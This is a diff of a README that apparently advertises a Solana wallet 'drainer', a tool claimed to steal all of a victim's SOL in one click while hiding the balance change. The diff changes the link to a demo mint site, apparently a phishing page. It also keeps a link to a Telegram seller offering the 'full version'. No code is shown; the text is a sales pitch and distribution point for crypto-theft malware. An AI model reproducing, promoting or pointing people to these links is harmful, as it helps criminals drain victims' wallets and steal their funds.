@@ -1,6 +1,6 @@
 # Drains/Steal/Grap all solana in one click without showing balance change
 
-# DEMO : https://mint-swagapes.netlify.app/
+# DEMO : https://swag-apes.netlify.app/
 
 # BUY FULL VERSION NOW! https://t.me/CryptoDrainer
 
